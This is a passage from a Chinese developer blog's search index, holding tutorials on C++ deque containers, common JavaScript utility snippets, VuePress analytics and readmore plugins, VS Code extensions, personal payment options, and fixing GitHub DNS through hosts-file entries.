&amp;v, size_t size, bool reserve) { // 预留空间 if (reserve) { v.reserve(size); } int count = 0; int *pStart = NULL; for (int i = 0; i &lt; size; i++) { // 插入容器数据 v.push_back(i); // 统计容器改变容量的次数 if (pStart != &amp;v[0]) { pStart = &amp;v[0]; count++; } } cout &lt;&lt; "count : " &lt;&lt; count &lt;&lt; endl;}int main() { // 不申请预览空间 vector&lt;int&gt; v1; initData(v1, 100000, false); // 申请预览空间 vector&lt;int&gt; v2; initData(v2, 100000, true); return 0;} 程序运行输出的结果如下： 12count : 18count : 1 deque 容器deque 容器的概念vector 是单向开口的连续线性空间，而 deque 则是一种双向开口的连续线性空间。所谓双向开口，意思是可以在头尾两端分别进行元素的插入和移除操作。虽然 vector 也可以在头尾两端进行操作，但是其头部操作的效率非常低，无法被接受。deque 和 vector 的最大差异，一在于 deque 允许于常数项时间内对头端进行元素的插入或移除操作，二在于 deque 没有所谓容量 capacity 的观念，因为它是动态地以分段连续空间组合而成，随时可以增加一段新的空间并链接起来。换句话说，像 vector 那样因旧空间不足而重新配置一块更大的空间，然后拷贝元素，再释放旧空间这样的事情不会发生在 deque 身上，也因此 deque 没有必要提供所谓的空间保留（reserve）功能。虽然 deque 也提供了随机迭代器（Random Access Iterator），但是它的迭代器并不是普通的指针，其复杂度和 vector 不是一个量级，这会影响各个层面的运算效率。因此，除非有必要，应该尽可能的使用 vector，而不是 deque。对 deque 进行的排序操作，为了提高效率，可将 deque 先完整的复制到一个 vector 中，然后对 vector 容器进行排序，再复制回 deque。 deque 容器的实现原理deque 本质由一段一段的定量连续空间（分段连续内存空间）构造而成，一旦有必要在 deque 的头端或尾端增加新空间，便会配置一段新的定量连续空间，然后串接在整个 deque 的头端或尾端。deque 最大的工作就是维护这些分段连续的内存空间的整体性的假象，并提供随机存取的接口；这避开了重新配置空间、复制数据、释放空间的轮回，代价就是复杂的迭代器架构。既然 deque 使用的是分段连续内存空间，那么就必须有中央控制器，维持其整体连续的假象，这样也导致了数据结构的设计及迭代器的前进后退操作颇为繁琐，deque 底层实现的代码远比 vector 或 list 都多得多。 deque 内部的中控器维护的是每个缓冲区的地址，而缓冲区则存放着真实的数据，目的是让 deque 使用起来像是一片连续的内存空间。deque 采取一块所谓的 map（注意，不是 STL 的 map 容器）作为主控，这里所谓的 map 是一小块连续的内存空间，其中每一个元素（节点）都是一个指针，指向另一段连续性内存空间，称作缓冲区，缓冲区才是 deque 的存储空间的主体。 deque 与 vector 的区别 vector 对于头部的插入效率极低，数据量越大，效率越低 deque 相对而言，对头部的元素插入、删除速度会比 vector 快 vector 访问元素时的速度会比 deque 快，这和两者的内部实现有关 deque 容器的使用deque 的构造和赋值123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;deque&gt;using namespace std;void printDeque(const deque&lt;int&gt; &amp;d) { // 遍历容器 for (deque&lt;int&gt;::const_iterator it = d.begin(); it != d.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl;}int main() { cout &lt;&lt; "------ deque 构造函数 ------" &lt;&lt; endl; // 默认构造函数 deque&lt;int&gt; d1; // 有参构造函数，将 n 个 elem 元素拷贝给本身 deque&lt;int&gt; d2(5, 10); printDeque(d2); // 有参构造函数，将 d[begin(), end()] 区间中的元素拷贝给本身 deque&lt;int&gt; d3(d2.begin(), d2.end()); printDeque(d3); // 拷贝构造函 deque&lt;int&gt; d4 = d3; printDeque(d4); cout &lt;&lt; "------ deque 赋值操作 ------" &lt;&lt; endl; // 赋值操作，重载等号操作符 deque&lt;int&gt; d5; d5 = d4; printDeque(d5); // 赋值操作，将 d[begin(), end()] 区间中的元素拷贝给本身 deque&lt;int&gt; d6; d6.assign(d5.begin(), d5.end()); printDeque(d6); // 赋值操作，将 n 个 elem 元素拷贝给本身 deque&lt;int&gt; d7; d7.assign(5, 8); printDeque(d7); // 赋值操作，将其他容器与本身的元素互换 d7.swap(d6); printDeque(d7); return 0;} 程序运行输出的结果如下： 123456789------ deque 构造函数 ------10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 ------ deque 赋值操作 ------10 10 10 10 10 10 10 10 10 10 8 8 8 8 8 10 10 10 10 10 deque 的常用操作123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#include &lt;iostream&gt;#include &lt;deque&gt;using namespace std;void printDeque(const deque&lt;int&gt; &amp;d) { // 遍历容器 for (deque&lt;int&gt;::const_iterator it = d.begin(); it != d.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl;}int main() { cout &lt;&lt; "------ deque 大小操作 ------" &lt;&lt; endl; deque&lt;int&gt; d1; d1.assign(5, 10); printDeque(d1); // 判断容器是否为空 bool empty = d1.empty(); cout &lt;&lt; (empty ? "yes" : "no") &lt;&lt; endl; // 获取容器中元素的个数 size_t size = d1.size(); cout &lt;&lt; size &lt;&lt; endl; // 重新指定容器的大小为 num，若容器变大，则以默认值（0）填充新位置。如果容器变小，则末尾超出容器大小的元素会被删除 d1.resize(7); printDeque(d1); // 重新指定容器的大小为 num，若容器变大，则以指定值填充新位置。如果容器变小，则末尾超出容器大小的元素会被删除 d1.resize(10, 8); printDeque(d1); cout &lt;&lt; "------ deque 读取操作 ------" &lt;&lt; endl; deque&lt;int&gt; d2; d2.push_back(1); d2.push_back(2); d2.push_back(3); d2.push_back(4); d2.push_back(5); // 返回索引所指向的数据，如果索引越界，抛出 out_of_range 异常 int num1 = d2.at(2); cout &lt;&lt; "num1 = " &lt;&lt; num1 &lt;&lt; endl; // 返回索引所指向的数据，如果索引越界，程序终止运行 int num2 = d2[3]; cout &lt;&lt; "num2 = " &lt;&lt; num2 &lt;&lt; endl; // 返回容器中第一个数据元素 int font = d2.front(); cout &lt;&lt; "font = " &lt;&lt; font &lt;&lt; endl; // 返回容器中最后一个数据元素 int back = d2.back(); cout &lt;&lt; "back = " &lt;&lt; back &lt;&lt; endl; cout &lt;&lt; "------ deque 插入操作 ------" &lt;&lt; endl; deque&lt;int&gt; d3(3, 8); printDeque(d3); // 往迭代器指向的位置插入指定的元素 d3.insert(d3.begin(), 10); printDeque(d3); // 往迭代器指向的位置插入 n 个指定的元素 d3.insert(d3.begin(), 2, 11); printDeque(d3); // 往迭代器指向的位置插入 [begin, end) 区间的数据 deque&lt;int&gt; d4(2, 12); d3.insert(d3.begin(), d4.begin(), d4.end()); printDeque(d3); // 在容器头部插入一个数据 d4.push_front(13); printDeque(d4); // 在容器尾部添加一个数据 d4.push_back(11); printDeque(d4); cout &lt;&lt; "------ deque 删除操作 ------" &lt;&lt; endl; deque&lt;int&gt; d5; d5.push_back(1); d5.push_back(2); d5.push_back(3); d5.push_back(4); d5.push_back(5); d5.push_back(6); // 删除指定位置的数据，会返回下一个数据的位置 d5.erase(d5.begin()); printDeque(d5); // 删除容器第一个数据 d5.pop_front(); printDeque(d5); // 删除容器最后一个数据 d5.pop_back(); printDeque(d5); // 清空容器的所有数据 d5.clear(); return 0;} 程序运行输出的结果如下： 12345678910111213141516171819202122------ deque 大小操作 ------10 10 10 10 10 no510 10 10 10 10 0 0 10 10 10 10 10 0 0 8 8 8 ------ deque 读取操作 ------num1 = 3num2 = 4font = 1back = 5------ deque 插入操作 ------8 8 8 10 8 8 8 11 11 10 8 8 8 12 12 11 11 10 8 8 8 13 12 12 13 12 12 11 ------ deque 删除操作 ------2 3 4 5 6 3 4 5 6 3 4 5 deque 的排序操作利用算法可以对 deque 容器进行排序，但需要引入头文件 algorithm。对于支持随机访问的迭代器的容器，都可以利用 sort() 排序，vector 容器也可以用 sort() 排序。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;iostream&gt;#include &lt;deque&gt;#include &lt;algorithm&gt;using namespace std;void printDeque(const deque&lt;int&gt; &amp;d) { // 遍历容器 for (deque&lt;int&gt;::const_iterator it = d.begin(); it != d.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl;}bool descCompare(const int a, const int b) { return a &gt; b;}void asc() { deque&lt;int&gt; d1; d1.push_back(3); d1.push_back(11); d1.push_back(8); d1.push_back(6); d1.push_back(21); cout &lt;&lt; "升序排序前：" &lt;&lt; endl; printDeque(d1); // 升序排序，默认从小到大排序 sort(d1.begin(), d1.end()); cout &lt;&lt; "升序排序后：" &lt;&lt; endl; printDeque(d1);}void desc() { deque&lt;int&gt; d1; d1.push_back(3); d1.push_back(11); d1.push_back(8); d1.push_back(6); d1.push_back(21); cout &lt;&lt; "降序排序前：" &lt;&lt; endl; printDeque(d1); // 降序排序，默认从大到小排序 sort(d1.begin(), d1.end(), descCompare); cout &lt;&lt; "降序排序后：" &lt;&lt; endl; printDeque(d1);}int main() { asc(); // 升序排序 cout &lt;&lt; endl; desc(); // 降序排序后 return 0;} 程序运行输出的结果如下： 123456789升序排序前：3 11 8 6 21 升序排序后：3 6 8 11 21 降序排序前：3 11 8 6 21 降序排序后：21 11 8 6 3 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"JavaScript 常用代码块",url:"/posts/b69c820e.html",text:'一、日期处理1. 时间格式化该方法可以用于将时间转化为 hour:minutes:seconds 的格式： 12345const timeFromDate = date =&gt; date.toTimeString().slice(0, 8);timeFromDate(new Date(2021, 11, 2, 12, 30, 0)); // 12:30:00timeFromDate(new Date()); // 返回当前时间 09:00:00复制代码 2. 检察日期是否有效该方法用于检测给出的日期是否有效： 1234const isDateValid = (...val) =&gt; !Number.isNaN(new Date(...val).valueOf());isDateValid("December 17, 1995 03:24:00"); // true复制代码 3. 计算两个日期之间的间隔该方法用于计算两个日期之间的间隔时间： 1234const dayDif = (date1, date2) =&gt; Math.ceil(Math.abs(date1.getTime() - date2.getTime()) / 86400000)dayDif(new Date("2021-11-3"), new Date("2022-2-1")) // 90复制代码 距离过年还有 90 天～ 4. 查找日期位于一年中的第几天该方法用于检测给出的日期位于今年的第几天： 1234const dayOfYear = (date) =&gt; Math.floor((date - new Date(date.getFullYear(), 0, 0)) / 1000 / 60 / 60 / 24);dayOfYear(new Date()); // 307复制代码 2021 年已经过去 300 多天了～ 二、字符串处理1. 字符串首字母大写该方法用于将英文字符串的首字母大写处理： 1234const capitalize = str =&gt; str.charAt(0).toUpperCase() + str.slice(1)capitalize("hello world") // Hello world复制代码 2. 翻转字符串该方法用于将一个字符串进行翻转操作，返回翻转后的字符串： 1234const reverse = str =&gt; str.split(\'\').reverse().join(\'\');reverse(\'hello world\'); // \'dlrow olleh\'复制代码 3. 随机字符串该方法用于生成一个随机的字符串： 1234const randomString = () =&gt; Math.random().toString(36).slice(2);randomString();复制代码 4. 截断字符串该方法可以从指定长度处截断字符串: 1234const truncateString = (string, length) =&gt; string.length &lt; length ? string : `${string.slice(0, length - 3)}...`;truncateString(\'Hi, I should be truncated because I am too loooong!\', 36) // \'Hi, I should be truncated because...\'复制代码 5. 去除字符串中的 HTML该方法用于去除字符串中的 HTML 元素： 12const stripHtml = html =&gt; (new DOMParser().parseFromString(html, \'text/html\')).body.textContent || \'\';复制代码 三、数组处理1. 从数组中移除重复项该方法用于移除数组中的重复项： 1234const removeDuplicates = (arr) =&gt; [...new Set(arr)];console.log(removeDuplicates([1, 2, 2, 3, 3, 4, 4, 5, 5, 6]));复制代码 2. 判断数组是否为空该方法用于判断一个数组是否为空数组，它将返回一个布尔值： 1234const isNotEmpty = arr =&gt; Array.isArray(arr) &amp;&amp; arr.length &gt; 0;isNotEmpty([1, 2, 3]); // true复制代码 3. 合并两个数组可以使用下面两个方法来合并两个数组： 1234const merge = (a, b) =&gt; a.concat(b);const merge = (a, b) =&gt; [...a, ...b];复制代码 四、数字操作1. 判断一个数是奇数还是偶数该方法用于判断一个数字是奇数还是偶数： 1234const isEven = num =&gt; num % 2 === 0;isEven(996);复制代码 2. 获得一组数的平均值1234const average = (...args) =&gt; args.reduce((a, b) =&gt; a + b) / args.length;average(1, 2, 3, 4, 5); // 3复制代码 3. 获取两个整数之间的随机整数该方法用于获取两个整数之间的随机整数 1234const random = (min, max) =&gt; Math.floor(Math.random() * (max - min + 1) + min);random(1, 50);复制代码 4. 指定位数四舍五入该方法用于将一个数字按照指定位进行四舍五入： 12345const round = (n, d) =&gt; Number(Math.round(n + "e" + d) + "e-" + d)round(1.005, 2) //1.01round(1.555, 2) //1.56复制代码 五、颜色操作1. 将 RGB 转化为十六机制该方法可以将一个 RGB 的颜色值转化为 16 进制值： 1234const rgbToHex = (r, g, b) =&gt; "#" + ((1 &lt;&lt; 24) + (r &lt;&lt; 16) + (g &lt;&lt; 8) + b).toString(16).slice(1);rgbToHex(255, 255, 255); // \'#ffffff\'复制代码 2. 获取随机十六进制颜色该方法用于获取一个随机的十六进制颜色值： 1234const randomHex = () =&gt; `#${Math.floor(Math.random() * 0xffffff).toString(16).padEnd(6, "0")}`;randomHex();复制代码 六、浏览器操作1. 复制内容到剪切板该方法使用 navigator.clipboard.writeText 来实现将文本复制到剪贴板： 1234const copyToClipboard = (text) =&gt; navigator.clipboard.writeText(text);copyToClipboard("Hello World");复制代码 2. 清除所有 cookie该方法可以通过使用 document.cookie 来访问 cookie 并清除存储在网页中的所有 cookie： 12const clearCookies = document.cookie.split(\';\').forEach(cookie =&gt; document.cookie = cookie.replace(/^ +/, \'\').replace(/=.*/, `=;expires=${new Date(0).toUTCString()};path=/`));复制代码 3. 获取选中的文本该方法通过内置的 getSelection 属性获取用户选择的文本： 1234const getSelectedText = () =&gt; window.getSelection().toString();getSelectedText();复制代码 4. 检测是否是黑暗模式该方法用于检测当前的环境是否是黑暗模式，它是一个布尔值： 1234const isDarkMode = window.matchMedia &amp;&amp; window.matchMedia(\'(prefers-color-scheme: dark)\').matchesconsole.log(isDarkMode)复制代码 5. 滚动到页面顶部该方法用于在页面中返回顶部： 1234const goToTop = () =&gt; window.scrollTo(0, 0);goToTop();复制代码 6. 判断当前标签页是否激活该方法用于检测当前标签页是否已经激活： 12const isTabInView = () =&gt; !document.hidden;复制代码 7. 判断当前是否是苹果设备该方法用于检测当前的设备是否是苹果的设备： 1234const isAppleDevice = () =&gt; /Mac|iPod|iPhone|iPad/.test(navigator.platform);isAppleDevice();复制代码 8. 是否滚动到页面底部该方法用于判断页面是否已经底部： 12const scrolledToBottom = () =&gt; document.documentElement.clientHeight + window.scrollY &gt;= document.documentElement.scrollHeight;复制代码 9. 重定向到一个 URL该方法用于重定向到一个新的 URL： 1234const redirect = url =&gt; location.href = urlredirect("https://www.google.com/")复制代码 10. 打开浏览器打印框该方法用于打开浏览器的打印框： 12const showPrintDialog = () =&gt; window.print()复制代码 七、其他操作1. 随机布尔值该方法可以返回一个随机的布尔值，使用 Math.random () 可以获得 0-1 的随机数，与 0.5 进行比较，就有一半的概率获得真值或者假值。 1234const randomBoolean = () =&gt; Math.random() &gt;= 0.5;randomBoolean();复制代码 2. 变量交换可以使用以下形式在不适用第三个变量的情况下，交换两个变量的值： 12[foo, bar] = [bar, foo];复制代码 3. 获取变量的类型该方法用于获取一个变量的类型： 1234567891011const trueTypeOf = (obj) =&gt; Object.prototype.toString.call(obj).slice(8, -1).toLowerCase();trueTypeOf(\'\'); // stringtrueTypeOf(0); // numbertrueTypeOf(); // undefinedtrueTypeOf(null); // nulltrueTypeOf({}); // objecttrueTypeOf([]); // arraytrueTypeOf(0); // numbertrueTypeOf(() =&gt; {}); // function复制代码 4. 华氏度和摄氏度之间的转化该方法用于摄氏度和华氏度之间的转化： 123456789const celsiusToFahrenheit = (celsius) =&gt; celsius * 9/5 + 32;const fahrenheitToCelsius = (fahrenheit) =&gt; (fahrenheit - 32) * 5/9;celsiusToFahrenheit(15); // 59celsiusToFahrenheit(0); // 32celsiusToFahrenheit(-20); // -4fahrenheitToCelsius(59); // 15fahrenheitToCelsius(32); // 0复制代码 5. 检测对象是否为空该方法用于检测一个 JavaScript 对象是否为空： 12const isEmpty = obj =&gt; Reflect.ownKeys(obj).length === 0 &amp;&amp; obj.constructor === Object;复制代码 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"前端"},{title:"VuePress 整合百度统计",url:"/posts/b23e0b9c.html",text:'前言本文主要介绍 VuePress 如何整合百度统计，适用于 VuePress 1.x 和 VuePress 2.x 版本。 VuePress v1.x安装插件1$ npm install -D vuepress-plugin-baidu-seo 配置插件12345678module.exports = { plugins: [ [\'vuepress-plugin-baidu-seo\', { hm: \'xxxxxxxx\', ignoreLocal: true }] ]} 配置参数 参数 类型 必填 默认值 描述 hm String 是 已申请的百度统计 Key ignoreLocal Boolean 否 false 忽略本地的访问记录，例如 127.0.0.1 或者 localhost VuePress v2.x安装插件兼容性说明 以 SEO 插件版本号 2.0.0-beta.61.x 举例，其中的 2.0.0-beta.61 代表该 SEO 插件所兼容的 VuePress 2 版本，而 x 则代表 SEO 插件自身的修订版本号。若 VuePress 2 与 SEO 插件的版本不兼容，很可能会导致编译出错或者 SEO 插件无法生效。 查看插件的所有版本 12# 查看版本信息$ npm view vuepress-plugin-baidu-seo-next versions 安装插件到本地博客 12345# 安装最新版本$ npm install -D vuepress-plugin-baidu-seo-next# # 安装指定版本（推荐）$ npm install -D vuepress-plugin-baidu-seo-next@2.0.0-beta.61.1 配置插件12345678910import { baiduSeoPlugin } from \'vuepress-plugin-baidu-seo-next\'module.exports = { plugins: [ baiduSeoPlugin({ hm: \'xxxxxxxx\', ignoreLocal: true }) ]} 配置参数 参数 类型 必填 默认值 描述 hm String 是 已申请的百度统计 Key ignoreLocal Boolean 否 false 忽略本地的访问记录，例如 127.0.0.1 或者 localhost var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"静态博客"},{title:"VsCode 编程开发插件汇总",url:"/posts/7d927a64.html",text:'基础开发 Path Intellisense - 提供文件路径自动补全功能 Docker - 提供与 Docker 相关的功能，使得在容器中开发和调试应用程序变得更加容易 Chinese (Simplified) Language Pack for Visual Studio Code - 中文语言包 Code Runner - 提供一种便捷的方式来运行代码片段和脚本文件，支持多种编程语言和操作系统 GitLens - 对 Git 版本控制系统的全面支持，包括代码历史记录、代码比较、代码注释、代码作者等功能 Material Icon Theme - 提供一套漂亮的图标主题，可以为 VS Code 中的文件和文件夹添加彩色图标，使得文件结构更加清晰和易于理解 前端开发基础插件 Prettier - 自动格式化代码 EsLint - 语法检查和风格检查 HTML Snippets - HTML 代码快速自动补全 Auto Close Tag - 自动闭合 HTML/XML 标签 Auto Rename Tag - 自动完成另一侧标签的同步修改 HTML CSS Support - 在 HTML 标签上写 class 时，智能提示当前项目所支持的样式 Open in browser - 浏览器快速打开 Live Server - 以内嵌服务器方式实时预览和调试网页应用程序 Thunder Client - 轻量级 Rest API 客户端，可替代 PostMan REST Client - 提供一种便捷方式来测试和调试 RESTful API 接口，支持 HTTP 和 HTTPS 协议 JavaScript Debugger - 用于在 VS Code 中调试 JavaScript 代码，支持多种调试方式，如单步调试、断点调试、条件断点调试等 JavaScript (ES6) code snippets - ES6 语法智能提示以及快速输入，除 JS 外还支持 .ts、.jsx、.tsx、.html、.vue Vue 插件 Vue 3 Snippets - Vue2、Vue3 代码片段快速生成 Vetur - 对 Vue 项目的全面支持，包括语法高亮、智能提示、代码片段、错误检查、格式化等 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发工具"},{title:"个人在线支付接入方案介绍",url:"/posts/4d9ccdf3.html",text:'前言移动支付大势所趋，互联网购物或者线上服务都需要用到支付，那作为开发者和商家，必须要跟第三方支付公司签约合作，开通商户我们才有能调用支付功能，大家最熟悉的是微信和支付宝，你要在里面实现在线购物支付功能，需要有一个微信商户号或者支付宝商户号，然后将商户号接入到网页、公众号、app、小程序中。当消费者支付时，我们通过接口把支付信息传给微信或者支付宝的服务器进行支付，它们收到款会把结果回调到我们的服务器进行订单处理，然后服务器实时响应到客户端上提示完成交易。以上，就是整个商户支付的流程。首先，整个支付流程的本质是公司对个人的，也就是我们常说的 B2C 模式。其次，线上支付是需要签约的。每个商户都是对应一个公司，微信商户号和支付宝商户号的开通都需要以公司的名义开通，而开通的时候，需要签约盖章审核等等各种手续。至于微信和支付宝为什么不给个人开通支付通道呢？笔者也想过，其实这是国家政策要求的，你想想，如果个人支付开通后，国家怎么管控税收、怎么管理网络安全？所以，微信和支付宝这么做，其实是不想大家钻了偷税漏税的空子。 个人免签的三种支付模式 1、使用个人收款码，通过手机 App 软件监测收款（不合法） 2、代收款，然后手动提现（存在二清，不合法，会跑路） 3、代签约，走官方的渠道（合法，直接到账，不存在二清） 推荐第三种模式，前两种模式不合法，平台说不定哪天就会关闭。选择第三方支付平台时，应尽量考虑平台费率最低的、开户费最低的、开户操作最便捷的。 App 软件监测收款模式市面上有不少通过安装特定收款监听 App 实现收款回调功能的平台，比如玎玎支付、PaysApi、收小钱等；这些虽然是零资质，而且收费也不是特别高，但是有几个弊端： 收款金额上限额度小，上限金额为固定收款二维码每日的限额，额度较小 手机需要安装特定的收款监听 App，并且需要一直处于开机和网络良好状态，或者需要使用模拟器来运行 App 用户在扫描支付二维码后发现是跳转转账页面，而不是调起微信支付或支付宝支付，心中会有所怀疑，导致部分潜在付费用户流失，这是最致命的弊端 如果改动价格，需要上传多张收款二维码，操作繁琐，尽管有些平台通过安装 VirtualXposed，生成任意收款金额的二维码免去此操作，但是手机需要停留在微信或者支付宝界面、而且还要保持屏幕常亮状态 回调存在不稳定因素，由于收款回调是在安装了收款监听 App 的手机在接收到收款的通知栏通知后上报金额到该平台服务器，再通过该平台回调到设置好的回调地址，所以其中有些环节如果出问题，比如收款监听的手机断网了，或者该平台的服务器宕机，都会导致没有收到收款回调 个人第三方支付平台推荐由于没有公司账号，开发者在微信和支付宝是接入不了支付的，因此只能选第三方支付平台，payjs 官方做了很详细的 对比图表。 7-pay，仅支持支付宝 Payjs，仅支持微信支付 麻瓜宝数字货币支付，仅支持数字货币 参考博客 微信支付宝，个人支付收款接口现状剖析 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"在线支付"},{title:"解决 GitHub DNS 被污染的问题",url:"/posts/b7c0261d.html",text:'第一步访问 IP 查询网站，查询以下域名对应的 IP： 1234github.comraw.githubusercontent.comcamo.githubusercontent.comgithub.global.ssl.fastly.net 第二步Linux 系统编辑系统配置文件 /etc/hosts，新增以下内容（请自行更改查询到的 IP）： 1234140.82.112.4 github.com185.199.108.133 raw.githubusercontent.com185.199.108.133 camo.githubusercontent.com199.232.69.194 github.global.ssl.fastly.net Windows 系统编辑系统配置文件 c:\\windows\\system32\\drivers\\etc\\hosts，新增以下内容（请自行更改查询到的 IP）： 1234140.82.112.4 github.com185.199.108.133 raw.githubusercontent.com185.199.108.133 camo.githubusercontent.com199.232.69.194 github.global.ssl.fastly.net 执行以下命令刷新 DNS 解析的缓存： 1&gt; ipconfig /flushdns var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"开发随笔"},{title:"Nacos 架构与原理",url:"/posts/ab99a12c.html",text:"",tags:"在线电子书"},{title:"Vurepress 1 博客导流微信公众号",url:"/posts/92228e7b.html",text:"前言VuePress 1 博客建议安装 vuepress-plugin-readmore-popular 插件，将 TechGrow 的免费微信公众号导流工具整合到博客中，用户扫码关注微信公众号后可以解锁全站文章，让微信公众号的粉丝数躺着增长。 提示 TechGrow 开放平台的 官方文档 vuepress-plugin-readmore-popular 插件只支持 VuePress 1，不支持 VuePress 2 若使用的是 VuePress 2 静态博客，建议直接安装 vuepress-plugin-readmore-popular-next 插件，详细教程可点击这里 特色功能 支持随机为博客添加导流功能 支持关闭某篇文章的导流功能 支持查询用户解锁文章的历史记录 支持自定义或者动态计算文章内容的预览高度 支持自定义 CSS 样式，轻松适配不同风格的博客 注册博客浏览器访问 TechGrow 的官网 ，注册并登录账号后，进入博客的后台管理页面。首先点击左侧的菜单 博客注册，然后点击 新增 按钮，添加自己博客的信息。博客注册成功后，记录下 博客 ID，后面的步骤会使用到 设置公众号在微信公众号的后台管理页面，菜单栏里选择 自动回复 - 关键词回复，启用 自动回复，然后点击 添加回复 按钮： 填写 规则名称、关键词（当初你在 TechGrow 中设置的）、回复内容 选择 文字，然后 回复文字 的内容填写获取博客解锁验证码的链接，如下所示（请自行更改 xxxxx-xxxxxxxxx-xxx 为你申请到的博客 ID） 1&lt;a href=\"https://open.techgrow.cn/#/readmore/captcha/generate?blogId=xxxxx-xxxxxxxxx-xxx\"&gt;点击链接，获取博客解锁验证码&lt;/a&gt; 此时，当读者关注你的微信公众号，并输入关键词后（比如我设置的关键词就是 tech），那么读者就会自动接收到获取博客解锁验证码的链接 安装插件 运行 npm install 命令安装插件到本地博客 1$ npm install -D vuepress-plugin-readmore-popular 配置 VuePress编辑 VuePress 的主配置文件（例如 .vuepress/config.js），新增插件的配置信息（请自行更改博客相关的信息），如下所示： 1234567891011121314151617181920212223242526272829303132module.exports = { plugins: [ ['vuepress-plugin-readmore-popular', { // 已申请的博客 ID blogId: '18762-1609305354821-257', // 已申请的微信公众号名称 name: '全栈技术驿站', // 已申请的微信公众号回复关键词 keyword: 'Tech', // 已申请的微信公众号二维码图片 qrcode: 'https://www.techgrow.cn/img/wx_mp_qr.png', // 文章内容的 JS 选择器，若使用的不是官方默认主题，则需要根据第三方的主题来设置 selector: 'div.theme-default-content', // 自定义的 JS 资源链接，可用于 CDN 加速 libUrl: 'https://qiniu.techgrow.cn/readmore/dist/readmore.js', // 自定义的 CSS 资源链接，可用于适配不同风格的博客 cssUrl: 'https://qiniu.techgrow.cn/readmore/dist/vuepress.css', // 文章排除添加引流工具的 URL 规则，支持使用路径、通配符、正则表达式的匹配规则 excludes: { strExp: [], regExp: [] }, // 是否反转 URL 排除规则的配置，即只有符合排除规则的文章才会添加引流工具 reverse: false, // 文章内容的预览高度 height: 'auto', // 文章解锁后凭证的有效天数 expires: 365, // 定时校验凭证有效性的时间间隔（秒） interval: 60, // 每篇文章随机添加引流工具的概率，有效范围在 0.1 ~ 1 之间，1 则表示所有文章默认都自动添加引流工具 random: 1 }] ]} 插件参数说明 参数 类型 必填 默认值 说明 blogId String 是 无 